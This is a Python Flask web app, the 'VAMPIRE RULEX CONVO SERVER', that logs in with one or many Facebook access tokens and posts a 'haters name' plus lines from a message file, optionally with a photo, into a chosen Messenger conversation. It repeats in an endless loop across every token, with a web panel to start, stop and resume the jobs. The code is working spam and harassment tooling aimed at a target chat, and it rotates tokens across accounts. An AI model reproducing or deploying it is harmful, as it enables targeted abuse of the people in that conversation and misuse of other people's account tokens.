import requests
import random
import string
import time
import os
from threading import Thread, Event
from flask import Flask, request, jsonify, render_template_string
import json
from datetime import datetime

app = Flask(__name__)

# Global dictionary to store tasks
tasks = {}

# Headers for Facebook API
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json',
    'Content-Type': 'application/x-www-form-urlencoded',
}

def generate_task_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))

def load_tokens(token_input):
    if os.path.isfile(token_input):
        with open(token_input, 'r') as f:
            tokens = [line.strip() for line in f if line.strip()]
        return tokens, 'file'
    else:
        return [token_input], 'single'

def load_messages(message_file):
    if os.path.isfile(message_file):
        with open(message_file, 'r', encoding='utf-8') as f:
            messages = [line.strip() for line in f if line.strip()]
        return messages
    return []

def upload_photo_to_facebook(access_token, thread_id, photo_path):
    """Upload photo to Facebook and get attachment ID"""
    try:
        upload_url = f'https://graph.facebook.com/v15.0/me/message_attachments'
        
        files = {
            'message': (None, json.dumps({
                'attachment': {
                    'type': 'image',
                    'payload': {'is_reusable': True}
                }
            })),
            'filedata': (os.path.basename(photo_path), open(photo_path, 'rb'), 'image/jpeg')
        }
        
        params = {'access_token': access_token}
        response = requests.post(upload_url, files=files, params=params, timeout=30)
        response_data = response.json()
        
        if 'attachment_id' in response_data:
            return response_data['attachment_id']
        return None
            
    except Exception as e:
        print(f"Photo upload error: {str(e)}")
        return None

def send_message_with_photo(access_token, thread_id, message_text, attachment_id):
    """Send message with photo attachment"""
    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
    parameters = {
        'access_token': access_token, 
        'message': message_text,
        'attachment_id': attachment_id
    }
    try:
        response = requests.post(api_url, data=parameters, headers=headers, timeout=30)
        return response.json()
    except Exception as e:
        return {'error': str(e)}

def send_messages_strong(task_id, access_tokens, thread_id, hatersname, photo_path, time_interval, messages):
    """Function to send messages with photo attachment"""
    stop_event = tasks[task_id]['stop_event']
    
    # Upload photo and get attachment ID
    attachment_id = None
    if photo_path and os.path.exists(photo_path):
        attachment_id = upload_photo_to_facebook(access_tokens[0], thread_id, photo_path)
        tasks[task_id]['attachment_id'] = attachment_id
    
    while not stop_event.is_set() and tasks[task_id]['status'] != 'stopped':
        for message in messages:
            if stop_event.is_set() or tasks[task_id]['status'] == 'stopped':
                break
                
            formatted_message = f"{hatersname} {message}"
            
            for access_token in access_tokens:
                if stop_event.is_set() or tasks[task_id]['status'] == 'stopped':
                    break
                
                if attachment_id:
                    # Send message with photo attachment
                    response = send_message_with_photo(access_token, thread_id, formatted_message, attachment_id)
                else:
                    # Send text-only message as fallback
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    parameters = {
                        'access_token': access_token, 
                        'message': formatted_message
                    }
                    response = requests.post(api_url, data=parameters, headers=headers, timeout=30).json()
                
                tasks[task_id]['last_message'] = formatted_message
                tasks[task_id]['sent_count'] += 1
                time.sleep(time_interval)
        
        if not stop_event.is_set() and tasks[task_id]['status'] != 'stopped':
            time.sleep(10)

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VAMPIRE RULEX CONVO SERVER</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial; background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); min-height: 100vh; padding: 20px; }
        .header { display: flex; justify-content: space-between; align-items: center; background: rgba(255,255,255,0.9); padding: 20px; border-radius: 15px; margin-bottom: 30px; }
        .owner-info { font-weight: bold; color: #333; }
        .title { text-align: center; font-size: 2.5em; font-weight: bold; background: linear-gradient(45deg, #ff0000, #ff6b6b, #ee5a24); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .container { max-width: 900px; margin: 0 auto; background: white; padding: 30px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-weight: bold; }
        input, select, textarea { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 10px; font-size: 16px; }
        .btn { background: linear-gradient(45deg, #ff6b6b, #ee5a24); color: white; border: none; padding: 15px; border-radius: 10px; font-size: 18px; cursor: pointer; width: 100%; margin: 10px 0; }
        .btn:hover { transform: translateY(-2px); }
        .btn-view { background: linear-gradient(45deg, #00a8ff, #0097e6); }
        .btn-stop { background: linear-gradient(45deg, #ff6b6b, #c23616); }
        .btn-resume { background: linear-gradient(45deg, #4cd137, #44bd32); }
        .btn-delete { background: linear-gradient(45deg, #e84118, #c23616); }
        .task-list { margin-top: 20px; }
        .task-item { background: #f8f9fa; padding: 15px; margin: 10px 0; border-radius: 10px; border-left: 4px solid #007bff; }
        .photo-preview { max-width: 200px; max-height: 200px; margin-top: 10px; border-radius: 10px; }
        .controls { display: flex; gap: 10px; margin-top: 10px; flex-wrap: wrap; }
        .control-btn { padding: 8px 15px; font-size: 14px; width: auto; }
    </style>
</head>
<body>
    <div class="header">
        <div class="owner-info">OWNER AYANSH MISHRA</div>
        <div class="title">VAMPIRE RULEX CONVO SERVER</div>
        <div class="owner-info">DEVELOPED BY RAJ MISHRA</div>
    </div>
    
    <div class="container">
        <!-- Task Creation Form -->
        <form id="taskForm" enctype="multipart/form-data">
            <div class="form-group">
                <label>Access Token:</label>
                <input type="text" name="token_input" placeholder="Enter token or token file path" required>
            </div>
            <div class="form-group">
                <label>Haters Name:</label>
                <input type="text" name="hatersname" placeholder="Enter name" required>
            </div>
            <div class="form-group">
                <label>Conversation ID:</label>
                <input type="text" name="convo_id" placeholder="Enter conversation ID" required>
            </div>
            <div class="form-group">
                <label>Time Interval (seconds):</label>
                <input type="number" name="time_interval" value="40" min="40" required>
            </div>
            <div class="form-group">
                <label>Message File:</label>
                <input type="file" name="message_file" accept=".txt" required>
            </div>
            <div class="form-group">
                <label>Attach Photo (Optional):</label>
                <input type="file" name="photo_file" accept=".jpg,.jpeg,.png">
                <img id="photoPreview" class="photo-preview" style="display: none;">
            </div>
            <button type="submit" class="btn">🚀 START SERVER WITH PHOTO</button>
        </form>

        <!-- View All Tasks Button -->
        <button class="btn btn-view" onclick="viewAllTasks()">📋 VIEW ALL TASKS</button>

        <!-- Task List -->
        <div id="taskList" class="task-list"></div>

        <!-- Result Display -->
        <div id="result"></div>
    </div>

    <script>
        // Photo preview
        document.querySelector('input[name="photo_file"]').addEventListener('change', function(e) {
            const file = e.target.files[0];
            const preview = document.getElementById('photoPreview');
            if (file) {
                const reader = new FileReader();
                reader.onload = function(e) {
                    preview.src = e.target.result;
                    preview.style.display = 'block';
                }
                reader.readAsDataURL(file);
            }
        });

        // Start task
        document.getElementById('taskForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const formData = new FormData(this);
            fetch('/start_task', { method: 'POST', body: formData })
            .then(r => r.json())
            .then(data => {
                const resultDiv = document.getElementById('result');
                if (data.success) {
                    resultDiv.innerHTML = `<div style="color: green; padding: 15px; background: #e8f5e8; border-radius: 10px;">
                        <h3>✅ ${data.message}</h3>
                        <p><strong>Task ID:</strong> ${data.task_id}</p>
                    </div>`;
                    viewAllTasks(); // Refresh task list
                } else {
                    resultDiv.innerHTML = `<div style="color: red; padding: 15px; background: #ffebee; border-radius: 10px;">
                        <h3>❌ ${data.error}</h3>
                    </div>`;
                }
            });
        });

        // View all tasks
        function viewAllTasks() {
            fetch('/get_all_tasks')
            .then(r => r.json())
            .then(tasks => {
                const taskList = document.getElementById('taskList');
                if (tasks.length === 0) {
                    taskList.innerHTML = '<p>No active tasks</p>';
                    return;
                }
                
                taskList.innerHTML = '<h3>📋 Active Tasks:</h3>';
                tasks.forEach(task => {
                    taskList.innerHTML += `
                        <div class="task-item">
                            <strong>Task ID:</strong> ${task.id}<br>
                            <strong>Status:</strong> ${task.status}<br>
                            <strong>Sent:</strong> ${task.sent_count} messages<br>
                            <strong>Last Message:</strong> ${task.last_message}<br>
                            <strong>Photo:</strong> ${task.has_photo ? 'Yes' : 'No'}<br>
                            <div class="controls">
                                <button class="btn control-btn btn-status" onclick="taskAction('status', '${task.id}')">Status</button>
                                <button class="btn control-btn btn-stop" onclick="taskAction('stop', '${task.id}')">Stop</button>
                                <button class="btn control-btn btn-resume" onclick="taskAction('resume', '${task.id}')">Resume</button>
                                <button class="btn control-btn btn-delete" onclick="taskAction('delete', '${task.id}')">Delete</button>
                            </div>
                        </div>
                    `;
                });
            });
        }

        // Task actions
        function taskAction(action, taskId) {
            const formData = new FormData();
            formData.append('task_id', taskId);
            
            let url = '';
            switch(action) {
                case 'status': url = '/task_status'; break;
                case 'stop': url = '/stop_task'; break;
                case 'resume': url = '/resume_task'; break;
                case 'delete': url = '/delete_task'; break;
            }
            
            fetch(url, { method: 'POST', body: formData })
            .then(r => r.json())
            .then(data => {
                if (action === 'status') {
                    alert(`Status: ${data.status}\\nSent: ${data.sent_count}\\nLast: ${data.last_message}`);
                } else {
                    alert(data.message);
                    viewAllTasks();
                }
            });
        }

        // Load tasks on page load
        window.onload = viewAllTasks;
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/start_task', methods=['POST'])
def start_task():
    try:
        token_input = request.form['token_input']
        hatersname = request.form['hatersname']
        convo_id = request.form['convo_id']
        time_interval = max(40, int(request.form['time_interval']))
        message_file = request.files['message_file']
        photo_file = request.files.get('photo_file')
        
        # Save files
        message_filename = f"messages_{int(time.time())}.txt"
        message_file.save(message_filename)
        
        photo_filename = None
        if photo_file and photo_file.filename:
            photo_filename = f"photo_{int(time.time())}.jpg"
            photo_file.save(photo_filename)
        
        # Load data
        access_tokens, token_type = load_tokens(token_input)
        messages = load_messages(message_filename)
        
        if not access_tokens:
            return jsonify({'error': 'No valid tokens found'})
        if not messages:
            return jsonify({'error': 'No messages found'})
        
        # Create task
        task_id = generate_task_id()
        stop_event = Event()
        
        tasks[task_id] = {
            'stop_event': stop_event,
            'status': 'running',
            'hatersname': hatersname,
            'convo_id': convo_id,
            'time_interval': time_interval,
            'messages': messages,
            'access_tokens': access_tokens,
            'photo_path': photo_filename,
            'last_message': 'No messages sent yet',
            'sent_count': 0,
            'start_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'thread': None
        }
        
        # Start thread
        thread = Thread(
            target=send_messages_strong,
            args=(task_id, access_tokens, convo_id, hatersname, photo_filename, time_interval, messages)
        )
        thread.daemon = True
        thread.start()
        tasks[task_id]['thread'] = thread
        
        return jsonify({
            'success': True,
            'task_id': task_id,
            'message': 'Server started with photo attachment!'
        })
        
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/get_all_tasks')
def get_all_tasks():
    task_list = []
    for task_id, task in tasks.items():
        task_list.append({
            'id': task_id,
            'status': task['status'],
            'sent_count': task['sent_count'],
            'last_message': task['last_message'],
            'has_photo': bool(task.get('photo_path')),
            'start_time': task['start_time']
        })
    return jsonify(task_list)

@app.route('/task_status', methods=['POST'])
def task_status():
    task_id = request.form['task_id']
    if task_id not in tasks:
        return jsonify({'error': 'Task not found'})
    task = tasks[task_id]
    return jsonify({
        'status': task['status'],
        'last_message': task['last_message'],
        'sent_count': task['sent_count'],
        'start_time': task['start_time']
    })

@app.route('/stop_task', methods=['POST'])
def stop_task():
    task_id = request.form['task_id']
    if task_id not in tasks:
        return jsonify({'error': 'Task not found'})
    tasks[task_id]['stop_event'].set()
    tasks[task_id]['status'] = 'stopped'
    return jsonify({'success': True, 'message': 'Task stopped'})

@app.route('/resume_task', methods=['POST'])
def resume_task():
    task_id = request.form['task_id']
    if task_id not in tasks:
        return jsonify({'error': 'Task not found'})
    tasks[task_id]['stop_event'].clear()
    tasks[task_id]['status'] = 'running'
    task = tasks[task_id]
    thread = Thread(
        target=send_messages_strong,
        args=(task_id, task['access_tokens'], task['convo_id'], 
              task['hatersname'], task['photo_path'], task['time_interval'], 
              task['messages'])
    )
    thread.daemon = True
    thread.start()
    tasks[task_id]['thread'] = thread
    return jsonify({'success': True, 'message': 'Task resumed'})

@app.route('/delete_task', methods=['POST'])
def delete_task():
    task_id = request.form['task_id']
    if task_id not in tasks:
        return jsonify({'error': 'Task not found'})
    tasks[task_id]['stop_event'].set()
    del tasks[task_id]
    return jsonify({'success': True, 'message': 'Task deleted'})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    print("🚀 VAMPIRE RULEX SERVER STARTING...")
    print("📍 Photo Attachment: ENABLED")
    print("📍 View Tasks: ENABLED") 
    print(f"📍 Port: {port}")
    print("✅ READY FOR RENDER DEPLOYMENT!")
    app.run(host='0.0.0.0', port=port, debug=False)